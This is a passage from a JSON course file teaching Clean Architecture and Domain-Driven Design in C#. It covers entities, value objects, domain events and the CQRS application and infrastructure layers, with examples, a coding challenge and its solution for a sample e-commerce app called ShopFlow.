              "correctAnswer": 1,
              "explanation": "The IProductRepository interface belongs in the Application Layer. This is a key principle of Clean Architecture and Dependency Inversion. The Application layer defines WHAT it needs (the interface contract) without knowing HOW it will be implemented. Infrastructure then implements this interface using Entity Framework Core or any other data access technology. This allows you to swap implementations without changing the Application layer. If the interface were in Infrastructure, Application would need to reference Infrastructure, violating the dependency rule.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-18-03",
          "title": "Domain Layer: Entities, Value Objects, and Domain Services",
          "moduleId": "module-18",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Entities vs Value Objects",
              "content": "Understanding the difference between Entities and Value Objects is crucial for Domain-Driven Design and Clean Architecture. Let's use a relatable analogy: People vs Money.\n\n**ENTITIES ARE LIKE PEOPLE:**\n\nThink about two identical twins - same height, same weight, same hair color, same everything visible. Are they the same person? Absolutely not! Even if every attribute matches, they are distinct individuals with their own unique identity. You track them by WHO they are, not WHAT they look like.\n\nIn software, an Entity is the same way:\n- A Customer with ID=42 is different from Customer with ID=43, even if they have the same name\n- An Order with ID=1001 is a specific, trackable order throughout its lifecycle\n- A Product with ID=500 maintains its identity even when you change its price\n\nEntities have:\n- A unique identifier (ID) that never changes\n- A lifecycle - they're created, modified, and potentially deleted\n- Identity equality - two entities are equal only if they have the same ID\n\n**VALUE OBJECTS ARE LIKE MONEY:**\n\nNow think about two $20 bills in your wallet. Are they the same? For all practical purposes, YES! You don't care which specific $20 bill you use to pay for lunch. A $20 is a $20 is a $20. You don't track individual bills; you track the amount.\n\nIn software, a Value Object works the same way:\n- Money(20, \"USD\") equals Money(20, \"USD\") - always!\n- Address(\"123 Main St\", \"Seattle\", \"WA\") equals another identical Address\n- Email(\"john@example.com\") is interchangeable with an identical Email\n\nValue Objects have:\n- No unique identifier - they ARE their attributes\n- Immutability - once created, they never change (you create a new one instead)\n- Value equality - two value objects are equal if all their properties are equal\n\n**THE PRACTICAL DIFFERENCE:**\n\nScenario: A customer moves to a new address.\n\n- Customer (Entity): Same customer, same ID. You UPDATE the customer's address reference.\n- Address (Value Object): You don't modify the old address. You CREATE a new Address and assign it to the customer.\n\nWhy? Because addresses don't have identity. \"123 Main St\" isn't a specific thing you're tracking - it's just a value. The customer IS a specific thing you're tracking.\n\n**REMEMBER:**\n- Entity = tracked by ID (like people - WHO they are)\n- Value Object = defined by attributes (like money - WHAT it is)\n\nThink: 'If I swapped one for an identical copy, would it matter? If yes, it's an Entity. If no, it's a Value Object.'"
            },
            {
              "type": "EXAMPLE",
              "title": "ShopFlow Domain Layer Code",
              "content": "Here's the complete Domain layer implementation for ShopFlow, demonstrating proper Entity and Value Object design with rich domain behavior.",
              "code": "// ===== SHOPFLOW DOMAIN LAYER =====\n\n// ========== VALUE OBJECTS ==========\n\n// Value Object: Money (immutable, value equality)\nnamespace ShopFlow.Domain.ValueObjects;\n\npublic sealed record Money\n{\n    public decimal Amount { get; }\n    public string Currency { get; }\n\n    public Money(decimal amount, string currency)\n    {\n        if (amount < 0)\n            throw new DomainException(\"Money amount cannot be negative\");\n        \n        if (string.IsNullOrWhiteSpace(currency) || currency.Length != 3)\n            throw new DomainException(\"Currency must be a 3-letter ISO code\");\n\n        Amount = amount;\n        Currency = currency.ToUpperInvariant();\n    }\n\n    // Factory method for USD\n    public static Money USD(decimal amount) => new(amount, \"USD\");\n    \n    // Factory method for zero\n    public static Money Zero(string currency) => new(0, currency);\n\n    // Rich behavior - Value Objects can have methods!\n    public Money Add(Money other)\n    {\n        if (Currency != other.Currency)\n            throw new DomainException($\"Cannot add {Currency} to {other.Currency}\");\n        \n        return new Money(Amount + other.Amount, Currency);\n    }\n\n    public Money Subtract(Money other)\n    {\n        if (Currency != other.Currency)\n            throw new DomainException($\"Cannot subtract {other.Currency} from {Currency}\");\n        \n        if (Amount < other.Amount)\n            throw new DomainException(\"Result would be negative\");\n        \n        return new Money(Amount - other.Amount, Currency);\n    }\n\n    public Money Multiply(int quantity)\n    {\n        if (quantity < 0)\n            throw new DomainException(\"Quantity cannot be negative\");\n        \n        return new Money(Amount * quantity, Currency);\n    }\n\n    public override string ToString() => $\"{Currency} {Amount:N2}\";\n}\n\n\n// Value Object: Address (immutable, value equality)\nnamespace ShopFlow.Domain.ValueObjects;\n\npublic sealed record Address\n{\n    public string Street { get; }\n    public string City { get; }\n    public string State { get; }\n    public string PostalCode { get; }\n    public string Country { get; }\n\n    public Address(\n        string street,\n        string city,\n        string state,\n        string postalCode,\n        string country)\n    {\n        if (string.IsNullOrWhiteSpace(street))\n            throw new DomainException(\"Street is required\");\n        if (string.IsNullOrWhiteSpace(city))\n            throw new DomainException(\"City is required\");\n        if (string.IsNullOrWhiteSpace(postalCode))\n            throw new DomainException(\"Postal code is required\");\n        if (string.IsNullOrWhiteSpace(country))\n            throw new DomainException(\"Country is required\");\n\n        Street = street.Trim();\n        City = city.Trim();\n        State = state?.Trim() ?? string.Empty;\n        PostalCode = postalCode.Trim();\n        Country = country.Trim();\n    }\n\n    public string FullAddress => $\"{Street}, {City}, {State} {PostalCode}, {Country}\";\n}\n\n\n// ========== ENTITIES ==========\n\n// Entity: Product (has identity, has behavior)\nnamespace ShopFlow.Domain.Entities;\n\npublic class Product\n{\n    public int Id { get; private set; }\n    public string Name { get; private set; }\n    public string Description { get; private set; }\n    public Money Price { get; private set; }\n    public int StockQuantity { get; private set; }\n    public ProductStatus Status { get; private set; }\n    public DateTime CreatedAt { get; private set; }\n    public DateTime? LastModifiedAt { get; private set; }\n\n    // Private constructor for EF Core\n    private Product() { }\n\n    // Factory method - ensures valid creation\n    public static Product Create(\n        string name,\n        string description,\n        Money price,\n        int initialStock)\n    {\n        if (string.IsNullOrWhiteSpace(name))\n            throw new DomainException(\"Product name is required\");\n        \n        if (name.Length > 200)\n            throw new DomainException(\"Product name cannot exceed 200 characters\");\n        \n        if (initialStock < 0)\n            throw new DomainException(\"Initial stock cannot be negative\");\n\n        return new Product\n        {\n            Name = name.Trim(),\n            Description = description?.Trim() ?? string.Empty,\n            Price = price ?? throw new DomainException(\"Price is required\"),\n            StockQuantity = initialStock,\n            Status = ProductStatus.Active,\n            CreatedAt = DateTime.UtcNow\n        };\n    }\n\n    // Rich domain behavior - not just getters/setters!\n    public void UpdatePrice(Money newPrice)\n    {\n        Price = newPrice ?? throw new DomainException(\"Price cannot be null\");\n        LastModifiedAt = DateTime.UtcNow;\n    }\n\n    public void AddStock(int quantity)\n    {\n        if (quantity <= 0)\n            throw new DomainException(\"Quantity to add must be positive\");\n        \n        StockQuantity += quantity;\n        \n        // Reactivate if was out of stock\n        if (Status == ProductStatus.OutOfStock)\n            Status = ProductStatus.Active;\n        \n        LastModifiedAt = DateTime.UtcNow;\n    }\n\n    public void RemoveStock(int quantity)\n    {\n        if (quantity <= 0)\n            throw new DomainException(\"Quantity to remove must be positive\");\n        \n        if (quantity > StockQuantity)\n            throw new InsufficientStockException(Id, StockQuantity, quantity);\n        \n        StockQuantity -= quantity;\n        \n        if (StockQuantity == 0)\n            Status = ProductStatus.OutOfStock;\n        \n        LastModifiedAt = DateTime.UtcNow;\n    }\n\n    public void Discontinue()\n    {\n        if (Status == ProductStatus.Discontinued)\n            throw new DomainException(\"Product is already discontinued\");\n        \n        Status = ProductStatus.Discontinued;\n        LastModifiedAt = DateTime.UtcNow;\n    }\n\n    public bool IsAvailable => Status == ProductStatus.Active && StockQuantity > 0;\n}\n\n\n// ========== REPOSITORY INTERFACE ==========\n// Defined in Domain or Application layer (we'll use Application)\n\nnamespace ShopFlow.Application.Products;\n\npublic interface IProductRepository\n{\n    Task<Product?> GetByIdAsync(int id, CancellationToken cancellationToken = default);\n    Task<IReadOnlyList<Product>> GetActiveProductsAsync(CancellationToken cancellationToken = default);\n    Task<IReadOnlyList<Product>> GetByCategoryAsync(int categoryId, CancellationToken cancellationToken = default);\n    Task AddAsync(Product product, CancellationToken cancellationToken = default);\n    Task UpdateAsync(Product product, CancellationToken cancellationToken = default);\n    Task<bool> ExistsAsync(int id, CancellationToken cancellationToken = default);\n}\n\n\n// ========== DOMAIN EXCEPTIONS ==========\n\nnamespace ShopFlow.Domain.Exceptions;\n\npublic class DomainException : Exception\n{\n    public DomainException(string message) : base(message) { }\n}\n\npublic class InsufficientStockException : DomainException\n{\n    public int ProductId { get; }\n    public int AvailableStock { get; }\n    public int RequestedQuantity { get; }\n\n    public InsufficientStockException(int productId, int available, int requested)\n        : base($\"Product {productId} has only {available} in stock, but {requested} was requested\")\n    {\n        ProductId = productId;\n        AvailableStock = available;\n        RequestedQuantity = requested;\n    }\n}\n\n\n// ========== ENUMS ==========\n\nnamespace ShopFlow.Domain.Enums;\n\npublic enum ProductStatus\n{\n    Active,\n    OutOfStock,\n    Discontinued\n}",
              "language": "csharp"
            },
            {
              "type": "WARNING",
              "title": "Domain Layer Anti-Patterns",
              "content": "## Common Mistakes That Violate Clean Architecture\n\nThe Domain layer is the heart of your application, and corrupting it with infrastructure concerns is one of the most common architectural mistakes. Here are anti-patterns to avoid:\n\n**ANTI-PATTERN 1: Infrastructure Dependencies in Domain**\n\n```csharp\n// BAD - Domain entity using Entity Framework!\npublic class Product\n{\n    [Key]  // ← EF Core attribute in Domain!\n    public int Id { get; set; }\n    \n    [Required, MaxLength(200)]  // ← More EF/validation attributes\n    public string Name { get; set; }\n    \n    // WORSE - Direct database access!\n    private readonly DbContext _context;\n    \n    public void Save() => _context.SaveChanges();  // ← NEVER do this!\n}\n```\n\n**Why it's bad**: Domain now depends on Microsoft.EntityFrameworkCore. You can't test Product without a database. You can't switch ORMs without rewriting Domain.\n\n**ANTI-PATTERN 2: Anemic Domain Model**\n\n```csharp\n// BAD - No behavior, just a data container\npublic class Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }  // ← Public setters everywhere\n    public decimal Price { get; set; }\n    public int Stock { get; set; }\n}\n\n// All logic lives in services instead\npublic class ProductService\n{\n    public void UpdateStock(Product product, int quantity)\n    {\n        product.Stock -= quantity;  // ← Logic outside the entity\n        if (product.Stock < 0)\n            throw new Exception(\"Not enough stock\");\n    }\n}\n```\n\n**Why it's bad**: The Product entity is just a dumb data bag. Business rules are scattered across services. Anyone can set Stock to -100 directly. No encapsulation.\n\n**ANTI-PATTERN 3: Using DTOs in Domain**\n\n```csharp\n// BAD - Domain method accepting a DTO\npublic class Order\n{\n    public void AddItem(OrderItemDto dto)  // ← DTO in Domain!\n    {\n        _items.Add(new OrderItem(dto.ProductId, dto.Quantity));\n    }\n}\n```\n\n**Why it's bad**: DTOs belong in Application layer. Domain shouldn't know about data transfer concerns.\n\n**ANTI-PATTERN 4: Calling External Services from Domain**\n\n```csharp\n// BAD - Domain calling external API\npublic class Order\n{\n    private readonly IEmailService _email;  // ← Infrastructure concern!\n    \n    public void Complete()\n    {\n        Status = OrderStatus.Completed;\n        _email.SendOrderConfirmation(this);  // ← Side effect in entity!\n    }\n}\n```\n\n**Why it's bad**: Domain entities shouldn't have infrastructure dependencies. Use Domain Events instead - emit an event, let Application/Infrastructure handle the email.\n\n**THE CORRECT PATTERN:**\n\n```csharp\n// GOOD - Rich domain model with encapsulation\npublic class Product\n{\n    public int Id { get; private set; }  // ← Private setters\n    public string Name { get; private set; }\n    public Money Price { get; private set; }  // ← Value Object\n    public int StockQuantity { get; private set; }\n\n    // Factory method for valid creation\n    public static Product Create(string name, Money price, int stock)\n    {\n        if (string.IsNullOrWhiteSpace(name))\n            throw new DomainException(\"Name required\");\n        // ... validation and creation\n    }\n\n    // Behavior with business rules\n    public void RemoveStock(int quantity)\n    {\n        if (quantity > StockQuantity)\n            throw new InsufficientStockException(...);\n        StockQuantity -= quantity;\n    }\n}\n```\n\n**GOLDEN RULES FOR DOMAIN LAYER:**\n\n1. NO references to Infrastructure packages (EF Core, HTTP clients, etc.)\n2. NO public setters - use methods that enforce business rules\n3. Entities have behavior, not just data\n4. Value Objects are immutable\n5. Validation happens inside the domain objects\n6. Use Domain Events for side effects, not direct calls"
            },
            {
              "type": "DEEP_DIVE",
              "title": "Domain Events",
              "content": "## Domain Events: Communicating What Happened\n\nDomain Events are a powerful pattern for decoupling side effects from domain logic. Instead of an entity directly calling external services, it raises an event that other parts of the system can react to.\n\n**THE PROBLEM WITHOUT DOMAIN EVENTS:**\n\nWhen an order is placed, you need to:\n- Send confirmation email\n- Update inventory\n- Notify warehouse\n- Record analytics\n\nWithout Domain Events, you might pollute your Order entity with all these concerns, or create a massive Application Service that does everything.\n\n**THE SOLUTION - DOMAIN EVENTS:**\n\n```csharp\n// Domain Event - describes what happened\nnamespace ShopFlow.Domain.Events;\n\npublic record OrderPlacedEvent(\n    int OrderId,\n    int CustomerId,\n    IReadOnlyList<OrderItemInfo> Items,\n    Money TotalAmount,\n    DateTime OccurredAt\n) : IDomainEvent;\n\npublic record OrderItemInfo(int ProductId, int Quantity, Money UnitPrice);\n\n// Base interface for all domain events\npublic interface IDomainEvent\n{\n    DateTime OccurredAt { get; }\n}\n\n\n// Entity raises events\nnamespace ShopFlow.Domain.Entities;\n\npublic class Order\n{\n    private readonly List<IDomainEvent> _domainEvents = new();\n    public IReadOnlyList<IDomainEvent> DomainEvents => _domainEvents.AsReadOnly();\n\n    public void Place()\n    {\n        if (Status != OrderStatus.Draft)\n            throw new DomainException(\"Can only place draft orders\");\n\n        Status = OrderStatus.Placed;\n        PlacedAt = DateTime.UtcNow;\n\n        // Raise event - no direct dependencies!\n        _domainEvents.Add(new OrderPlacedEvent(\n            Id,\n            CustomerId,\n            Items.Select(i => new OrderItemInfo(i.ProductId, i.Quantity, i.UnitPrice)).ToList(),\n            TotalAmount,\n            DateTime.UtcNow\n        ));\n    }\n\n    public void ClearDomainEvents() => _domainEvents.Clear();\n}\n\n\n// Event Handler in Application Layer\nnamespace ShopFlow.Application.Orders.EventHandlers;\n\npublic class OrderPlacedEventHandler : INotificationHandler<OrderPlacedEvent>\n{\n    private readonly IEmailService _emailService;\n    private readonly IProductRepository _productRepository;\n    private readonly IAnalyticsService _analytics;\n\n    public OrderPlacedEventHandler(\n        IEmailService emailService,\n        IProductRepository productRepository,\n        IAnalyticsService analytics)\n    {\n        _emailService = emailService;\n        _productRepository = productRepository;\n        _analytics = analytics;\n    }\n\n    public async Task Handle(OrderPlacedEvent notification, CancellationToken cancellationToken)\n    {\n        // Update inventory\n        foreach (var item in notification.Items)\n        {\n            var product = await _productRepository.GetByIdAsync(item.ProductId, cancellationToken);\n            product?.RemoveStock(item.Quantity);\n        }\n\n        // Send email (Infrastructure handles the actual sending)\n        await _emailService.SendOrderConfirmationAsync(\n            notification.OrderId,\n            cancellationToken);\n\n        // Record analytics\n        await _analytics.TrackOrderPlacedAsync(notification, cancellationToken);\n    }\n}\n\n\n// Dispatching events (usually in UnitOfWork or DbContext)\nnamespace ShopFlow.Infrastructure.Data;\n\npublic class AppDbContext : DbContext\n{\n    private readonly IMediator _mediator;\n\n    public override async Task<int> SaveChangesAsync(CancellationToken cancellationToken = default)\n    {\n        // Dispatch domain events before saving\n        await DispatchDomainEventsAsync(cancellationToken);\n\n        return await base.SaveChangesAsync(cancellationToken);\n    }\n\n    private async Task DispatchDomainEventsAsync(CancellationToken cancellationToken)\n    {\n        var entities = ChangeTracker\n            .Entries<Entity>()\n            .Where(e => e.Entity.DomainEvents.Any())\n            .Select(e => e.Entity)\n            .ToList();\n\n        var events = entities\n            .SelectMany(e => e.DomainEvents)\n            .ToList();\n\n        entities.ForEach(e => e.ClearDomainEvents());\n\n        foreach (var domainEvent in events)\n        {\n            await _mediator.Publish(domainEvent, cancellationToken);\n        }\n    }\n}\n```\n\n**BENEFITS OF DOMAIN EVENTS:**\n\n1. **Decoupling**: Order entity doesn't know about emails, analytics, or warehouses\n2. **Single Responsibility**: Each handler does one thing\n3. **Testability**: Test Order.Place() without mocking email services\n4. **Extensibility**: Add new handlers without modifying Order entity\n5. **Auditability**: Events are a natural audit log\n\n**WHEN TO USE DOMAIN EVENTS:**\n\n- When something happened that other parts of the system care about\n- When you have multiple side effects from one action\n- When you want to avoid coupling between aggregates\n- When you need an audit trail of what happened"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-18-03-challenge-01",
              "title": "Create a Value Object",
              "description": "Implement an Address Value Object following Clean Architecture and DDD principles.",
              "instructions": "Create an Address value object for the ShopFlow e-commerce system that:\n\n1. Is immutable (use a record or readonly properties)\n2. Validates all required fields in the constructor\n3. Uses value equality (two addresses with same values are equal)\n4. Includes these properties: Street, City, State, PostalCode, Country\n5. Has a computed FullAddress property that formats the complete address\n6. Throws a DomainException for invalid data\n\nRemember: Value Objects have no identity - they ARE their attributes!",
              "starterCode": "namespace ShopFlow.Domain.ValueObjects;\n\n// Implement the Address Value Object here\n// Requirements:\n// - Immutable (consider using a record)\n// - Validation in constructor\n// - Value equality\n// - Properties: Street, City, State, PostalCode, Country\n// - Computed property: FullAddress\n\npublic class DomainException : Exception\n{\n    public DomainException(string message) : base(message) { }\n}",
              "solution": "namespace ShopFlow.Domain.ValueObjects;\n\npublic class DomainException : Exception\n{\n    public DomainException(string message) : base(message) { }\n}\n\n// Using 'record' for automatic value equality and immutability\npublic sealed record Address\n{\n    public string Street { get; }\n    public string City { get; }\n    public string State { get; }\n    public string PostalCode { get; }\n    public string Country { get; }\n\n    public Address(\n        string street,\n        string city,\n        string state,\n        string postalCode,\n        string country)\n    {\n        // Validate required fields\n        if (string.IsNullOrWhiteSpace(street))\n            throw new DomainException(\"Street is required\");\n        \n        if (string.IsNullOrWhiteSpace(city))\n            throw new DomainException(\"City is required\");\n        \n        if (string.IsNullOrWhiteSpace(postalCode))\n            throw new DomainException(\"Postal code is required\");\n        \n        if (string.IsNullOrWhiteSpace(country))\n            throw new DomainException(\"Country is required\");\n\n        // Normalize and assign (trimming whitespace)\n        Street = street.Trim();\n        City = city.Trim();\n        State = state?.Trim() ?? string.Empty;  // State can be optional\n        PostalCode = postalCode.Trim();\n        Country = country.Trim();\n    }\n\n    // Computed property for formatted address\n    public string FullAddress =>\n        string.IsNullOrEmpty(State)\n            ? $\"{Street}, {City} {PostalCode}, {Country}\"\n            : $\"{Street}, {City}, {State} {PostalCode}, {Country}\";\n\n    // Note: 'record' automatically provides:\n    // - Value equality (Equals, ==, !=)\n    // - GetHashCode based on all properties\n    // - ToString showing all values\n    // - Deconstruction\n    // - With-expressions for creating modified copies\n}",
              "language": "csharp",
              "testCases": [
                {"id": "test-1", "description": "Address is immutable (no public setters)", "expectedOutput": "Properties have no setters or private setters only", "isVisible": true},
                {"id": "test-2", "description": "Constructor validates Street is required", "expectedOutput": "Throws DomainException for empty street", "isVisible": true},
                {"id": "test-3", "description": "Two addresses with same values are equal", "expectedOutput": "address1 == address2 returns true", "isVisible": true},
                {"id": "test-4", "description": "FullAddress returns formatted string", "expectedOutput": "Formatted address string", "isVisible": true}
              ],
              "hints": [
                {"level": 1, "text": "C# records automatically provide value equality and immutability - perfect for Value Objects!"},
                {"level": 2, "text": "Use 'sealed record Address' to prevent inheritance and ensure immutability."},
                {"level": 3, "text": "Throw DomainException in the constructor if required fields are null or whitespace."},
                {"level": 4, "text": "The FullAddress property should use string interpolation to combine all parts: $\"{Street}, {City}, {State} {PostalCode}, {Country}\""}
              ],
              "commonMistakes": [
                {"mistake": "Using public setters on properties", "consequence": "Address becomes mutable, violating Value Object rules", "correction": "Use init-only setters or readonly properties set only in constructor"},
                {"mistake": "Not validating in constructor", "consequence": "Invalid addresses can be created, causing bugs later", "correction": "Validate all required fields and throw DomainException for invalid data"},
                {"mistake": "Using class instead of record", "consequence": "Need to manually implement Equals, GetHashCode for value equality", "correction": "Use record type which provides value equality by default"}
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-18-04",
          "title": "Application and Infrastructure Layers in Practice",
          "moduleId": "module-18",
          "order": 4,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "The Conductor and the Orchestra",
              "content": "To understand the relationship between Application and Infrastructure layers, think of a symphony orchestra performance.\n\n**THE APPLICATION LAYER IS THE CONDUCTOR:**\n\nThe conductor stands at the front, sheet music in hand, directing the performance. They know:\n- WHAT music should be played (the use cases)\n- WHEN each section should play (orchestration)\n- The tempo, dynamics, and expression (business rules)\n\nBut the conductor doesn't actually PLAY any instrument. They don't know how to blow into a trumpet or draw a bow across violin strings. They just know what sound they want and when.\n\nIn software, the Application layer is your conductor:\n- It defines use cases: CreateOrderHandler, ProcessPaymentHandler\n- It orchestrates workflow: \"First validate, then save, then send confirmation\"\n- It declares what it needs: IProductRepository, IEmailService, IPaymentGateway\n- It doesn't implement the details - it just waves the baton\n\n**THE INFRASTRUCTURE LAYER IS THE ORCHESTRA:**\n\nThe orchestra musicians are the ones who actually produce the music. The violinist knows exactly how to create that soaring melody. The percussionist knows the precise technique for a dramatic timpani roll. Each musician is a specialist in their instrument.\n\nIn software, the Infrastructure layer is your orchestra:\n- ProductRepository knows how to use Entity Framework to save products\n- SendGridEmailService knows the SendGrid API for sending emails\n- StripePaymentGateway knows how to process payments through Stripe\n- Each implementation is a specialist in its external technology\n\n**THE MAGIC OF INTERFACES (THE SHEET MUSIC):**\n\nThe sheet music is the contract between conductor and orchestra. It says \"play an A-flat here\" without specifying which instrument or technique. Any competent musician can read it.\n\nInterfaces are your sheet music:\n- `IProductRepository.SaveAsync(product)` - the conductor's instruction\n- The SQL Server musician implements it with T-SQL\n- The PostgreSQL musician implements it differently\n- The MongoDB musician uses document storage\n- All can perform the same piece!\n\n**THE PERFORMANCE (RUNTIME):**\n\nWhen the concert begins:\n1. The conductor (Application) signals \"play the save melody\"\n2. The specific musician (Infrastructure implementation) performs it\n3. The audience (users) hears beautiful music\n\nWhen your application runs:\n1. CreateOrderHandler says _orderRepository.SaveAsync(order)\n2. DI resolves to SqlOrderRepository (or whatever is registered)\n3. The order gets saved to the database\n4. The user sees \"Order created successfully\"\n\n**WHY THIS SEPARATION MATTERS:**\n\nImagine if the conductor had to know how to play every instrument. One person managing 50 different techniques? Chaos! Instead:\n- Conductor focuses on the performance (Application on use cases)\n- Musicians focus on their instrument (Infrastructure on external tech)\n- Sheet music connects them (Interfaces as contracts)\n\nThink: 'The Application layer conducts the symphony - it knows WHAT should happen and WHEN. Infrastructure plays the instruments - it knows HOW to actually do it.'"
            },
            {
              "type": "EXAMPLE",
              "title": "ShopFlow Application Layer",
              "content": "The Application layer contains your use cases implemented as Commands (write operations) and Queries (read operations). Here's how ShopFlow implements the CQRS pattern with MediatR.",
              "code": "// ===== SHOPFLOW APPLICATION LAYER =====\n// Using CQRS pattern with MediatR\n\n// ========== COMMANDS (Write Operations) ==========\n\n// Command: Request object describing what to do\nnamespace ShopFlow.Application.Products.Commands.CreateProduct;\n\npublic record CreateProductCommand(\n    string Name,\n    string Description,\n    decimal Price,\n    string Currency,\n    int InitialStock,\n    int CategoryId\n) : IRequest<CreateProductResult>;\n\npublic record CreateProductResult(\n    int ProductId,\n    string Name,\n    string PriceFormatted\n);\n\n\n// Handler: Implements the use case\nnamespace ShopFlow.Application.Products.Commands.CreateProduct;\n\npublic class CreateProductHandler : IRequestHandler<CreateProductCommand, CreateProductResult>\n{\n    private readonly IProductRepository _productRepository;\n    private readonly ICategoryRepository _categoryRepository;\n    private readonly IUnitOfWork _unitOfWork;\n\n    public CreateProductHandler(\n        IProductRepository productRepository,\n        ICategoryRepository categoryRepository,\n        IUnitOfWork unitOfWork)\n    {\n        _productRepository = productRepository;\n        _categoryRepository = categoryRepository;\n        _unitOfWork = unitOfWork;\n    }\n\n    public async Task<CreateProductResult> Handle(\n        CreateProductCommand request,\n        CancellationToken cancellationToken)\n    {\n        // 1. Validate business rules\n        var categoryExists = await _categoryRepository.ExistsAsync(\n            request.CategoryId, cancellationToken);\n        \n        if (!categoryExists)\n            throw new NotFoundException(\"Category\", request.CategoryId);\n\n        // 2. Create domain entity using factory method\n        var price = new Money(request.Price, request.Currency);\n        \n        var product = Product.Create(\n            request.Name,\n            request.Description,\n            price,\n            request.InitialStock);\n\n        // 3. Persist using repository (interface - no EF knowledge here!)\n        await _productRepository.AddAsync(product, cancellationToken);\n        await _unitOfWork.SaveChangesAsync(cancellationToken);\n\n        // 4. Return result DTO\n        return new CreateProductResult(\n            product.Id,\n            product.Name,\n            product.Price.ToString());\n    }\n}\n\n\n// Validator: Input validation using FluentValidation\nnamespace ShopFlow.Application.Products.Commands.CreateProduct;\n\npublic class CreateProductValidator : AbstractValidator<CreateProductCommand>\n{\n    public CreateProductValidator()\n    {\n        RuleFor(x => x.Name)\n            .NotEmpty().WithMessage(\"Product name is required\")\n            .MaximumLength(200).WithMessage(\"Name cannot exceed 200 characters\");\n\n        RuleFor(x => x.Price)\n            .GreaterThan(0).WithMessage(\"Price must be greater than zero\");\n\n        RuleFor(x => x.Currency)\n            .NotEmpty().WithMessage(\"Currency is required\")\n            .Length(3).WithMessage(\"Currency must be 3-letter ISO code\");\n\n        RuleFor(x => x.InitialStock)\n            .GreaterThanOrEqualTo(0).WithMessage(\"Stock cannot be negative\");\n\n        RuleFor(x => x.CategoryId)\n            .GreaterThan(0).WithMessage(\"Valid category is required\");\n    }\n}\n\n\n// ========== QUERIES (Read Operations) ==========\n\n// Query: Request for data\nnamespace ShopFlow.Application.Products.Queries.GetProduct;\n\npublic record GetProductQuery(int ProductId) : IRequest<ProductDto?>;\n\n\n// DTO: Data Transfer Object for responses\nnamespace ShopFlow.Application.Products.Queries.GetProduct;\n\npublic record ProductDto(\n    int Id,\n    string Name,\n    string Description,\n    decimal Price,\n    string Currency,\n    string PriceFormatted,\n    int StockQuantity,\n    string Status,\n    bool IsAvailable,\n    DateTime CreatedAt,\n    DateTime? LastModifiedAt\n);\n\n\n// Query Handler\nnamespace ShopFlow.Application.Products.Queries.GetProduct;\n\npublic class GetProductHandler : IRequestHandler<GetProductQuery, ProductDto?>\n{\n    private readonly IProductRepository _productRepository;\n\n    public GetProductHandler(IProductRepository productRepository)\n    {\n        _productRepository = productRepository;\n    }\n\n    public async Task<ProductDto?> Handle(\n        GetProductQuery request,\n        CancellationToken cancellationToken)\n    {\n        var product = await _productRepository.GetByIdAsync(\n            request.ProductId, cancellationToken);\n\n        if (product is null)\n            return null;\n\n        // Map domain entity to DTO\n        return new ProductDto(\n            product.Id,\n            product.Name,\n            product.Description,\n            product.Price.Amount,\n            product.Price.Currency,\n            product.Price.ToString(),\n            product.StockQuantity,\n            product.Status.ToString(),\n            product.IsAvailable,\n            product.CreatedAt,\n            product.LastModifiedAt);\n    }\n}\n\n\n// ========== INTERFACES (Defined in Application) ==========\n\nnamespace ShopFlow.Application.Common.Interfaces;\n\npublic interface IUnitOfWork\n{\n    Task<int> SaveChangesAsync(CancellationToken cancellationToken = default);\n}\n\nnamespace ShopFlow.Application.Products;\n\npublic interface IProductRepository\n{\n    Task<Product?> GetByIdAsync(int id, CancellationToken cancellationToken = default);\n    Task<IReadOnlyList<Product>> GetAllAsync(CancellationToken cancellationToken = default);\n    Task<IReadOnlyList<Product>> GetByCategoryAsync(int categoryId, CancellationToken cancellationToken = default);\n    Task AddAsync(Product product, CancellationToken cancellationToken = default);\n    Task UpdateAsync(Product product, CancellationToken cancellationToken = default);\n    Task<bool> ExistsAsync(int id, CancellationToken cancellationToken = default);\n}",
              "language": "csharp"
            },
            {
              "type": "EXAMPLE",
              "title": "ShopFlow Infrastructure Layer",
              "content": "The Infrastructure layer implements all the interfaces defined in Application using concrete technologies like Entity Framework Core, SendGrid, Stripe, etc.",
              "code": "// ===== SHOPFLOW INFRASTRUCTURE LAYER =====\n\n// ========== DATABASE CONTEXT ==========\n\nnamespace ShopFlow.Infrastructure.Data;\n\npublic class AppDbContext : DbContext, IUnitOfWork\n{\n    public AppDbContext(DbContextOptions<AppDbContext> options) \n        : base(options)\n    {\n    }\n\n    public DbSet<Product> Products => Set<Product>();\n    public DbSet<Order> Orders => Set<Order>();\n    public DbSet<Customer> Customers => Set<Customer>();\n    public DbSet<Category> Categories => Set<Category>();\n\n    protected override void OnModelCreating(ModelBuilder modelBuilder)\n    {\n        // Apply all configurations from this assembly\n        modelBuilder.ApplyConfigurationsFromAssembly(\n            typeof(AppDbContext).Assembly);\n        \n        base.OnModelCreating(modelBuilder);\n    }\n\n    // Implementing IUnitOfWork\n    public override async Task<int> SaveChangesAsync(\n        CancellationToken cancellationToken = default)\n    {\n        // Add audit fields\n        foreach (var entry in ChangeTracker.Entries<Entity>())\n        {\n            if (entry.State == EntityState.Modified)\n            {\n                entry.Entity.SetModifiedAt(DateTime.UtcNow);\n            }\n        }\n\n        return await base.SaveChangesAsync(cancellationToken);\n    }\n}\n\n\n// ========== ENTITY CONFIGURATIONS ==========\n\nnamespace ShopFlow.Infrastructure.Data.Configurations;\n\npublic class ProductConfiguration : IEntityTypeConfiguration<Product>\n{\n    public void Configure(EntityTypeBuilder<Product> builder)\n    {\n        builder.ToTable(\"Products\");\n\n        builder.HasKey(p => p.Id);\n\n        builder.Property(p => p.Name)\n            .IsRequired()\n            .HasMaxLength(200);\n\n        builder.Property(p => p.Description)\n            .HasMaxLength(2000);\n\n        // Configure Value Object (Money) as owned entity\n        builder.OwnsOne(p => p.Price, priceBuilder =>\n        {\n            priceBuilder.Property(m => m.Amount)\n                .HasColumnName(\"Price\")\n                .HasPrecision(18, 2);\n            \n            priceBuilder.Property(m => m.Currency)\n                .HasColumnName(\"Currency\")\n                .HasMaxLength(3);\n        });\n\n        builder.Property(p => p.StockQuantity)\n            .IsRequired();\n\n        builder.Property(p => p.Status)\n            .HasConversion<string>()\n            